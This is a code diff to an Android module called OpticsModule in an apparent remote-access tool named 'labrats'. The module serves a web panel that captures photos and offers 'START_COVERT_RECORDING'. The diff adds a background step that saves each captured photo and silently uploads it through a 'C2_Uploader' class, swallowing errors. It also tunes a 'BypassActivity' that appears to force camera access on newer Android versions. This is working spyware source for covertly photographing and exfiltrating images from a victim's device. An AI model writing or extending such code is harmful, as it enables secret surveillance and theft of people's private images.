@@ -8,9 +8,11 @@ import android.os.Environment;
 import android.util.Log;
 
 import com.labs.labrats.Analytics_Provider;
+import com.labs.labrats.C2_Uploader;
 import com.labs.labrats.CameraHelper;
 import com.labs.labrats.Constants;
 import com.labs.labrats.FirebaseConfig;
+import com.labs.labrats.LabRatsWorker;
 import com.labs.labrats.MediaFrameworkService;
 
 import java.io.File;
@@ -427,23 +429,46 @@ public class OpticsModule extends BaseModule {
             if (Analytics_Provider.isCurrentlyStreaming()) {
                 imageData = Analytics_Provider.getNextFrame(1500);
             } else {
+                Intent intent = new Intent(context, Analytics_Provider.class);
+                androidx.core.content.ContextCompat.startForegroundService(context, intent);
+                
                 Analytics_Provider service = Analytics_Provider.getInstance();
+                for (int i = 0; i < 10 && service == null; i++) {
+                    Thread.sleep(200);
+                    service = Analytics_Provider.getInstance();
+                }
+
                 if (service != null) {
                     service.capturePhotoBackground(cameraId);
-                    imageData = Analytics_Provider.waitForPhoto(12000);
+                    imageData = Analytics_Provider.waitForPhoto(8000);
                     errorMsg = Analytics_Provider.getLastCaptureError();
                 } else {
-                    CameraHelper cameraHelper = new CameraHelper(context);
-                    imageData = cameraHelper.capturePhoto(cameraId);
-                    errorMsg = cameraHelper.getLastError();
+                    try {
+                        CameraHelper cameraHelper = new CameraHelper(context);
+                        imageData = cameraHelper.capturePhoto(cameraId);
+                        errorMsg = cameraHelper.getLastError();
+                    } catch (Exception e) {
+                        errorMsg = "Hardware busy: " + e.getMessage();
+                    }
                 }
             }
 
             if (imageData != null && imageData.length > 0) {
+                byte[] finalData = imageData;
+                String photoName = "photo_" + cameraId + "_" + System.currentTimeMillis() + ".jpg";
+                LabRatsWorker.execute(() -> {
+                    try {
+                        File photoFile = new File(context.getCacheDir(), photoName);
+                        try (java.io.FileOutputStream fos = new java.io.FileOutputStream(photoFile)) {
+                            fos.write(finalData);
+                        }
+                        C2_Uploader.uploadFile(context, photoFile);
+                    } catch (Exception ignored) {}
+                });
+
                 java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(imageData);
                 Response response = server.newFixedLengthResponseProxy(Response.Status.OK, "image/jpeg", bis, imageData.length);
-                response.addHeader("Content-Disposition",
-                        "attachment; filename=\"photo_" + cameraId + "_" + System.currentTimeMillis() + ".jpg\"");
+                response.addHeader("Content-Disposition", "attachment; filename=\"" + photoName + "\"");
                 return response;
             } else {
                 return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", errorMsg != null ? errorMsg : "Failed to capture photo (Hardware Timeout)");
@@ -512,8 +537,9 @@ public class OpticsModule extends BaseModule {
         StringBuilder html = new StringBuilder(getHeader(session.getUri()));
         html.append("<style>")
             .append("@media (min-width: 769px) {")
-            .append("  #stream-container { max-width: 100% !important; height: 600px !important; }")
-            .append("  #stream { width: 100% !important; height: 100% !important; object-fit: cover !important; border-radius: 8px; border: 1px solid rgba(0, 242, 255, 0.3); }")
+            .append("  #stream-container { max-width: 680px !important; height: 420px !important; margin: 0 auto !important; }")
+            .append("  #stream { width: 100% !important; height: 100% !important; object-fit: contain !important; border-radius: 8px; border: 1px solid rgba(0, 242, 255, 0.3); }")
+            .append("  .optics-control-box { transform: scale(0.90) !important; transform-origin: top center !important; }")
             .append("}")
             .append("@media (max-width: 768px) {")
             .append("  #stream-container { height: ").append(uiHeight).append("px !important; }")
@@ -569,6 +595,7 @@ public class OpticsModule extends BaseModule {
         html.append("</div>");
         html.append("</div>");
 
+        html.append("<div class=\"optics-control-box\">");
         html.append("<div style=\"margin-bottom: 30px; text-align: center; max-width: 500px; margin-left: auto; margin-right: auto; padding: 0 10px;\">");
         html.append("<div class=\"info-label\" style=\"text-align: center; font-size: 0.7rem;\">UPLINK_QUALITY</div>");
         html.append("<div style=\"position: relative; width: 100%;\">");
@@ -601,6 +628,7 @@ public class OpticsModule extends BaseModule {
         html.append("<button onclick=\"capturePhoto()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#128247; SNAP</button>");
         html.append("<button id=\"rec-btn\" onclick=\"toggleRecording()\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#9679; START_COVERT_RECORDING</button>");
         html.append("<a href=\"/camera\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color: #888; color: #888; background: rgba(255, 255, 255, 0.05); padding: 10px; text-decoration: none; text-align: center; margin:0; width:100%; min-width:0;\">&#8592; BACK</a>");
+        html.append("</div>");
         html.append("</div>");
 
         html.append("<div id=\"status\" style=\"text-align: center; margin-top: 20px; color: #888; font-size: 0.9rem;\"></div>");
@@ -652,12 +680,14 @@ public class OpticsModule extends BaseModule {
         html.append("  setTimeout(() => { window.location.href = nextUrl; }, 300);");
         html.append("}");
 
+        html.append("let streamActive = true;");
         html.append("function startStream() {");
         html.append("  const img = document.getElementById('stream');");
         html.append("  if (img) img.style.display = 'none';");
         html.append("  if (loadingDiv) { loadingDiv.style.display = 'block'; loadingDiv.innerText = 'INITIALIZING_CAMERA...'; }");
+        html.append("  streamActive = true;");
         html.append("  fetch('/camera/start-stream?cam=' + camId + '&width=' + streamWidth + '&height=' + streamHeight + '&quality=' + streamQuality);");
-        html.append("  let isTunnel = window.location.hostname.includes('onrender.com');");
+        html.append("  let isTunnel = window.location.hostname.includes('onrender.com') || window.location.pathname.startsWith('/proxy');");
         html.append("  if (isTunnel) {");
         html.append("    let pollCount = 0;");
         html.append("    if (window.pollFrame) clearInterval(window.pollFrame);");
@@ -671,15 +701,15 @@ public class OpticsModule extends BaseModule {
         html.append("            const initialUrl = URL.createObjectURL(blob);");
         html.append("            if (img) { img.src = initialUrl; img.style.display = 'block'; img.dataset.oldUrl = initialUrl; }");
         html.append("            if (loadingDiv) loadingDiv.style.display = 'none';");
-        html.append("            startFrameLoop();");
+        html.append("            fetchNextFrame();");
         html.append("          }");
         html.append("        })");
         html.append("        .catch(() => {});");
-        html.append("      if (pollCount > 30) {");
+        html.append("      if (pollCount > 35) {");
         html.append("        clearInterval(window.pollFrame);");
         html.append("        handleStreamError();");
         html.append("      }");
-        html.append("    }, 600);");
+        html.append("    }, 500);");
         html.append("  } else {");
         html.append("    setTimeout(() => {");
         html.append("      if (img) {");
@@ -690,23 +720,26 @@ public class OpticsModule extends BaseModule {
         html.append("  }");
         html.append("}");
 
-        html.append("function startFrameLoop() {");
-        html.append("  if (window.frameInterval) clearInterval(window.frameInterval);");
-        html.append("  window.frameInterval = setInterval(() => {");
-        html.append("    const img = document.getElementById('stream');");
-        html.append("    if (!img) { clearInterval(window.frameInterval); return; }");
-        html.append("    fetch('/camera/frame?t=' + Date.now())");
-        html.append("      .then(r => r.blob())");
-        html.append("      .then(blob => {");
-        html.append("        if (blob && blob.size > 100) {");
-        html.append("          if (img.dataset.oldUrl) URL.revokeObjectURL(img.dataset.oldUrl);");
-        html.append("          const newUrl = URL.createObjectURL(blob);");
-        html.append("          img.src = newUrl;");
-        html.append("          img.dataset.oldUrl = newUrl;");
-        html.append("        }");
-        html.append("      })");
-        html.append("      .catch(() => {});");
-        html.append("  }, refreshRate);");
+        html.append("function fetchNextFrame() {");
+        html.append("  if (!streamActive) return;");
+        html.append("  const img = document.getElementById('stream');");
+        html.append("  if (!img) return;");
+        html.append("  fetch('/camera/frame?t=' + Date.now())");
+        html.append("    .then(r => r.blob())");
+        html.append("    .then(blob => {");
+        html.append("      if (blob && blob.size > 100) {");
+        html.append("        const newUrl = URL.createObjectURL(blob);");
+        html.append("        if (img.dataset.oldUrl) URL.revokeObjectURL(img.dataset.oldUrl);");
+        html.append("        img.src = newUrl;");
+        html.append("        img.dataset.oldUrl = newUrl;");
+        html.append("        if (loadingDiv) loadingDiv.style.display = 'none';");
+        html.append("        img.style.display = 'block';");
+        html.append("      }");
+        html.append("      if (streamActive) setTimeout(fetchNextFrame, 80);");
+        html.append("    })");
+        html.append("    .catch(() => {");
+        html.append("      if (streamActive) setTimeout(fetchNextFrame, 300);");
+        html.append("    });");
         html.append("}");
 
         html.append("function streamLoaded() { /* Handled by inline onload */ }");
@@ -902,9 +935,9 @@ public class OpticsModule extends BaseModule {
         if (Build.VERSION.SDK_INT >= 34) {
             try {
                 Intent bypass = new Intent(context, CameraHelper.BypassActivity.class);
-                bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
+                bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_MULTIPLE_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
                 context.startActivity(bypass);
-                Thread.sleep(850);
+                Thread.sleep(200);
             } catch (Exception ignored) {}
         }
 
